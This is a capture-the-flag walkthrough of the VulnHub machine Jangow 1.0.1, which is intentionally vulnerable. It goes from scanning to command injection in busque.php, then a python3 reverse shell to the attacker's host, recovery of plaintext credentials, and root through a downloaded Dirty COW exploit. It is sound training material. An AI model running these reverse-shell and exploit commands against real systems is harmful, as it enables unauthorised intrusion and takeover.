# Vulnhub - Jangow: 1.0.1

Jangow: 1.0.1 is a boot-to-root vulnerable machine. It is available to download from [VulnHub](https://www.vulnhub.com/entry/jangow-101,754/).

The machine's `ip` can be found on the login screen of the machine. Alternatively, `netdiscover` or `nmap` can be used to assist in locating the machine's `ip`, as shown below.

```bash
┌─[user@parrot]─[~/Documents/jangow]
└──╼ $sudo nmap -sP 192.168.1.0/24
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-22 01:36 GMT
Nmap scan report for jangow01.lan (192.168.1.189)
Host is up (0.00023s latency).
MAC Address: 08:00:27:D0:0C:0B (Oracle VirtualBox virtual NIC)
Nmap done: 256 IP addresses (1 hosts up) scanned in 6.67 seconds
```

## Recon

We begin with an `nmap` scan to reveal any open ports on the host.

``` bash
┌─[user@parrot]─[~/Documents/jangow]
└──╼ $sudo nmap -sC -sV -v -p- -oN jangow.nmap 192.168.1.189
Nmap scan report for jangow01.lan (192.168.1.189)
Host is up (0.014s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
80/tcp open  http    Apache httpd 2.4.18
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2021-06-10 18:05  site/
|_
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Index of /
MAC Address: 08:00:27:D0:0C:0B (Oracle VirtualBox virtual NIC)
Service Info: Host: 127.0.0.1; OS: Unix

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Dec 21 18:04:38 2021 -- 1 IP address (1 host up) scanned in 374.25 seconds
```

`nmap` reveals that we have two ports open, `21`, which is running `vsftpd 3.0.3` and `80`, which is running `Apache httpd 2.4.18`. While we can see that the `http-server-header` reveals this system is most likely `Ubuntu`.

We can make a quick check to see if anonymous login is permitted over `ftp`.

```bash
┌─[user@parrot]─[~/Documents/jangow]
└──╼ $ftp 192.168.1.189
Connected to 192.168.1.189.
220 (vsFTPd 3.0.3)
Name (192.168.1.189:user): anonymous
331 Please specify the password.
Password:
530 Login incorrect.
Login failed.
ftp> bye
221 Goodbye.
```

It would appear that anonymous login is disabled. Now lets try enumerating the web page on `80`. Visiting the page at `http://192.168.1.189` only reveals a directory listing that points to `http://192.168.1.189/site`, so we will begin our `gobuster` scan there.

```bash
┌─[user@parrot]─[~/Documents/jangow]
└──╼ $gobuster dir -u http://192.168.1.189/site -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.189/site
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2021/12/22 01:51:57 Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 301) [Size: 320] [--> http://192.168.1.189/site/assets/]
/css                  (Status: 301) [Size: 317] [--> http://192.168.1.189/site/css/]
/wordpress            (Status: 301) [Size: 323] [--> http://192.168.1.189/site/wordpress/]
/js                   (Status: 301) [Size: 316] [--> http://192.168.1.189/site/js/]
...
```

Interestingly, there is a directory listed as `wordpress`. We will also run a `gobuster` scan in this directory as well.

```bash
┌─[user@parrot]─[~/Documents/jangow]
└──╼ $gobuster dir -u http://192.168.1.189/site/wordpress -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.189/site/wordpress
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2021/12/22 01:55:14 Starting gobuster in directory enumeration mode
===============================================================
/config.php           (Status: 200) [Size: 87]
...
```

A single `config.php` can be found here, however it should be noted that there does not appear to be any additional items of interest in this directory. For a sanity check, we can try running `wpscan` to see what the results would be.

```bash
┌─[user@parrot]─[~/Documents/jangow]
└──╼ $wpscan --url http://192.168.1.189/site/wordpress
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.17
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________


Scan Aborted: The remote website is up, but does not seem to be running WordPress.
```

And, as expected, it does not appear to actually be running `WordPress`. Let's see if we can view anything interesting in the `config.php` file from earlier.

```bash
┌─[user@parrot]─[~/Documents/jangow]
└──╼ $curl http://192.168.1.189/site/wordpress/config.php; echo
Connection failed: Access denied for user 'desafio02'@'localhost' (using password: YES)
```

Interesting, it would appear we now have a username of `desafio02`. Revisiting `ftp`, we can see if we can log in with this user using a variety of simple passwords.

```bash
┌─[user@parrot]─[~/Documents/jangow]
└──╼ $ftp 192.168.1.189
Connected to 192.168.1.189.
220 (vsFTPd 3.0.3)
Name (192.168.1.189:user): desafio02
331 Please specify the password.
Password:
530 Login incorrect.
Login failed.
ftp> bye
221 Goodbye.
```

But each time is unsuccessful. Let's revisit `http://192.168.1.189/site`. Using `curl` and `grep`, we can quickly view some of the linked items on the page.

```bash
┌─[user@parrot]─[~/Documents/jangow]
└──╼ $curl http://192.168.1.189/site/ | grep -Ei 'href|src'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 10190  100 10190    0     0  3317k      0 --:--:-- --:--:-- --:--:-- 3317k
        <link rel="icon" type="image/x-icon" href="assets/favicon.ico" />
        <script src="https://use.fontawesome.com/releases/v5.15.3/js/all.js" crossorigin="anonymous"></script>
        <link href="https://fonts.googleapis.com/css?family=Varela+Round" rel="stylesheet" />
        <link href="https://fonts.googleapis.com/css?family=Nunito:200,200i,300,300i,400,400i,600,600i,700,700i,800,800i,900,900i" rel="stylesheet" />
        <link href="css/styles.css" rel="stylesheet" />
                <a class="navbar-brand" href="#page-top">Start Bootstrap</a>
                        <li class="nav-item"><a class="nav-link" href="#about">About</a></li>
                        <li class="nav-item"><a class="nav-link" href="#projects">Projects</a></li>
                        <li class="nav-item"><a class="nav-link" href="busque.php?buscar=">Buscar</a></li>
                        <a class="btn btn-primary" href="#about">Get Started</a>
                            <a href="https://startbootstrap.com/theme/grayscale/">the preview page.</a>
                <img class="img-fluid" src="assets/img/ipad.png" alt="..." />
                    <div class="col-xl-8 col-lg-7"><img class="img-fluid mb-3 mb-lg-0" src="assets/img/bg-masthead.jpg" alt="..." /></div>
                    <div class="col-lg-6"><img class="img-fluid" src="assets/img/demo-image-01.jpg" alt="..." /></div>
                    <div class="col-lg-6"><img class="img-fluid" src="assets/img/demo-image-02.jpg" alt="..." /></div>
                                <div class="small text-black-50"><a href="#!">hello@yourdomain.com</a></div>
                    <a class="mx-2" href="#!"><i class="fab fa-twitter"></i></a>
                    <a class="mx-2" href="#!"><i class="fab fa-facebook-f"></i></a>
                    <a class="mx-2" href="#!"><i class="fab fa-github"></i></a>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/js/bootstrap.bundle.min.js"></script>
        <script src="js/scripts.js"></script>
```

A quick overview of the results reveals an interesting link.

```bash
<li class="nav-item"><a class="nav-link" href="busque.php?buscar=">Buscar</a></li>
```

`buscar`, according to Google translate, means `search for`, so let's try some quick checks to see if this is actually a search bar, or, even better, if we have `LFI`.

```bash
┌─[user@parrot]─[~/Documents/jangow]
└──╼ $curl http://192.168.1.189/site/busque.php?buscar=help

┌─[user@parrot]─[~/Documents/jangow]
└──╼ $curl http://192.168.1.189/site/busque.php?buscar=/etc/passwd

```

Both times yield empty results. Let's try to check for simple `RCE`.

```bash
┌─[user@parrot]─[~/Documents/jangow]
└──╼ $curl http://192.168.1.189/site/busque.php?buscar=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

And we have `RCE`!

## User Flag

Knowing we now have `RCE`, let's set up a listener on our machine using and attempt to catch a `reverse shell`. Trying a variety of `reverse shell` one-liners was uncessessful on different ports, however, eventually I was able to recieve a shell using `python3` on port `443`, being sure to also `url encode` the command.

```bash
┌─[user@parrot]─[~/Documents/jangow]
└──╼ $curl "http://192.168.1.189/site/busque.php?buscar=python3%20-c%20%27import%20socket%2Cos%2Cpty%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%22192.168.1.73%22%2C443%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3Bos.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bpty.spawn%28%22%2Fbin%2Fbash%22%29%27"

...

┌─[✗]─[user@parrot]─[~/Documents/jangow]
└──╼ $sudo nc -lvnp 443
listening on [any] 443 ...
connect to [192.168.1.73] from (UNKNOWN) [192.168.1.189] 47732
www-data@jangow01:/var/www/html/site$
```

Next, using `python3` and some magic, we can upgrade our shell to a full `tty`.

```bash
www-data@jangow01:/var/www/html/site$ python3 -c 'import pty; pty.spawn("/bin/bash");'
<html/site$ python3 -c 'import pty; pty.spawn("/bin/bash");'
```

Then we can `bg` the shell using `CTRL-Z` then run `stty echo -raw`, then return the shell to the `fg`, and press `ENTER` twice.

```bash
www-data@jangow01:/var/www/html/site$ ^Z
[1]+  Stopped                 sudo nc -lvnp 443
┌─[✗]─[user@parrot]─[~/Documents/jangow]
└──╼ $stty raw -echo
┌─[user@parrot]─[~/Documents/jangow]
sudo nc -lvnp 443

www-data@jangow01:/var/www/html/site$
```

Now, let's begin enumerating some of the web directories.

```bash
www-data@jangow01:/var/www/html/site$ ls -la
total 40
drwxr-xr-x 6 www-data www-data  4096 Jun 10  2021 .
drwxr-xr-x 3 root     root      4096 Oct 31 19:36 ..
drwxr-xr-x 3 www-data www-data  4096 Jun  3  2021 assets
-rw-r--r-- 1 www-data www-data    35 Jun 10  2021 busque.php
drwxr-xr-x 2 www-data www-data  4096 Jun  3  2021 css
-rw-r--r-- 1 www-data www-data 10190 Jun 10  2021 index.html
drwxr-xr-x 2 www-data www-data  4096 Jun  3  2021 js
drwxr-xr-x 2 www-data www-data  4096 Jun 10  2021 wordpress
www-data@jangow01:/var/www/html/site$ ls -la wordpress/
total 24
drwxr-xr-x 2 www-data www-data  4096 Jun 10  2021 .
drwxr-xr-x 6 www-data www-data  4096 Jun 10  2021 ..
-rw-r--r-- 1 www-data www-data   347 Jun 10  2021 config.php
-rw-r--r-- 1 www-data www-data 10190 Jun 10  2021 index.html
www-data@jangow01:/var/www/html/site$ ls -la ../
total 16
drwxr-xr-x 3 root     root     4096 Oct 31 19:36 .
drwxr-xr-x 3 root     root     4096 Oct 31 19:33 ..
-rw-r--r-- 1 www-data www-data  336 Oct 31 19:36 .backup
drwxr-xr-x 6 www-data www-data 4096 Jun 10  2021 site
www-data@jangow01:/var/www/html/site$ cat ../.backup
$servername = "localhost";
$database = "jangow01";
$username = "jangow01";
$password = "abygurl69";
// Create connection
$conn = mysqli_connect($servername, $username, $password, $database);
// Check connection
if (!$conn) {
    die("Connection failed: " . mysqli_connect_error());
}
echo "Connected successfully";
mysqli_close($conn);
```

Some quick searching reveals a `.backup` file that appears to contain some credentials. Maybe we can `su` to `jangow01`?

```bash
www-data@jangow01:/var/www/html/site$ su jangow01
Password:
jangow01@jangow01:/var/www/html/site$ whoami
jangow01
```

Success! Now we can grab the `user` flag.

```bash
jangow01@jangow01:/var/www/html/site$ cd
jangow01@jangow01:~$ ls -la
total 36
drwxr-xr-x 4 jangow01 desafio02 4096 Jun 10  2021 .
drwxr-xr-x 3 root     root      4096 Out 31 19:04 ..
-rw------- 1 jangow01 desafio02  200 Out 31 19:39 .bash_history
-rw-r--r-- 1 jangow01 desafio02  220 Jun 10  2021 .bash_logout
-rw-r--r-- 1 jangow01 desafio02 3771 Jun 10  2021 .bashrc
drwx------ 2 jangow01 desafio02 4096 Jun 10  2021 .cache
drwxrwxr-x 2 jangow01 desafio02 4096 Jun 10  2021 .nano
-rw-r--r-- 1 jangow01 desafio02  655 Jun 10  2021 .profile
-rw-r--r-- 1 jangow01 desafio02    0 Jun 10  2021 .sudo_as_admin_successful
-rw-rw-r-- 1 jangow01 desafio02   33 Jun 10  2021 user.txt
jangow01@jangow01:~$ cat user.txt
d41d8cd98f00b204e9800998ecf8427e
```

## Root Flag

Since we have `jangow01`'s password, lets quickly check if we can run `sudo`

```bash
jangow01@jangow01:~$ sudo -l
sudo: não foi possível resolver máquina jangow01: Conexão recusada
[sudo] senha para jangow01:
Sinto muito, usuário jangow01 não pode executar sudo em jangow01.
```

Unfortunetly, it appears we are unable to. Perhaps a quick check of the kernel and distribution version might reveal a quick win.

```bash
jangow01@jangow01:~$ uname -a
Linux jangow01 4.4.0-31-generic #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
jangow01@jangow01:~$ lsb_release -a
No LSB modules are available.
Distributor ID: Ubuntu
Description:    Ubuntu 16.04.1 LTS
Release:        16.04
Codename:       xenial
```

It looks like we might be able to exploit the kernel using `dirty cow`, based on the old distrobution release. `searchsploit` contains a `dirty cow` exploit that I have previously found reliable in the past.

```bash
Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privilege Escalation (/etc/passw | linux/local/40839.c
```

We can stang up a web server on our machine using `sudo python -m http.server 443` and use `wget` to download the file. The exploit can be copied from `searchsploit` by running `searchsploit -m 40839`. Note, we have to use port `443` as this port is not blocked.

```
jangow01@jangow01:~$ wget http://192.168.1.73:443/40839.c
--2021-12-21 19:49:37--  http://192.168.1.73:443/40839.c
Conectando-se a 192.168.1.73:443... conectado.
A requisição HTTP foi enviada, aguardando resposta... 200 OK
Tamanho: 4814 (4K) [text/x-csrc]
Salvando em: “40839.c”

40839.c             100%[===================>]  4,70K  --.-KB/s    in 0s

2021-12-21 19:49:37 (70,7 MB/s) - “40839.c” salvo [4814/4814]
```

Now we can compile the exploit and give it a try.

```bash
jangow01@jangow01:~$ gcc -pthread 40839.c -lcrypt
jangow01@jangow01:~$ ./a.out
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password:
Complete line:
firefart:fik57D3GJz/tk:0:0:pwned:/root:/bin/bash

mmap: 7fa6923f4000
^C
jangow01@jangow01:~$ su firefart
Senha:
firefart@jangow01:/home/jangow01#
```

We can now `su` as `firefart` with `root` permissions and can retrieve the flag. :)

```bash
firefart@jangow01:/home/jangow01# uname -a; id; cat /root/proof.txt
Linux jangow01 4.4.0-31-generic #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
uid=0(firefart) gid=0(root) grupos=0(root)
                       @@@&&&&&&&&&&&&&&&&&&&@@@@@@@@@@@@@@@&&&&&&&&&&&&&&
                       @  @@@@@@@@@@@@@@@&#   #@@@@@@@@&(.    /&@@@@@@@@@@
                       @  @@@@@@@@@@&( .@@@@@@@@&%####((//#&@@@&   .&@@@@@
                       @  @@@@@@@&  @@@@@@&@@@@@&%######%&@*   ./@@*   &@@
                       @  @@@@@* (@@@@@@@@@#/.               .*@.  .#&.   &@@@&&
                       @  @@@, /@@@@@@@@#,                       .@.  ,&,   @@&&
                       @  @&  @@@@@@@@#.         @@@,@@@/           %.  #,   %@&
                       @@@#  @@@@@@@@/         .@@@@@@@@@@            *  .,    @@
                       @@&  @@@@@@@@*          @@@@@@@@@@@             ,        @
                       @&  .@@@@@@@(      @@@@@@@@@@@@@@@@@@@@@        *.       &@
                      @@/  *@@@@@@@/           @@@@@@@@@@@#                      @@
                      @@   .@@@@@@@/          @@@@@@@@@@@@@              @#      @@
                      @@    @@@@@@@@.          @@@@@@@@@@@              @@(      @@
                       @&   .@@@@@@@@.         , @@@@@@@ *            .@@@*(    .@
                       @@    ,@@@@@@@@,   @@@@@@@@@&*%@@@@@@@@@,    @@@@@(%&*   &@
                       @@&     @@@@@@@@@@@@@@@@@         (@@@@@@@@@@@@@@%@@/   &@
                       @ @&     ,@@@@@@@@@@@@@@@,@@@@@@@&%@@@@@@@@@@@@@@@%*   &@
                       @  @@.     .@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%*    &@&
                       @  @@@&       ,@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%/     &@@&&
                       @  @@@@@@.        *%@@@@@@@@@@@@@@@@@@@@&#/.      &@@@@&&
                       @  @@@@@@@@&               JANGOW               &@@@
                       @  &&&&&&&&&@@@&     @@(&@ @. %.@ @@%@     &@@@&&&&
                                     &&&@@@@&%       &/    (&&@@@&&&
                                       (((((((((((((((((((((((((((((





da39a3ee5e6b4b0d3255bfef95601890afd80709
```

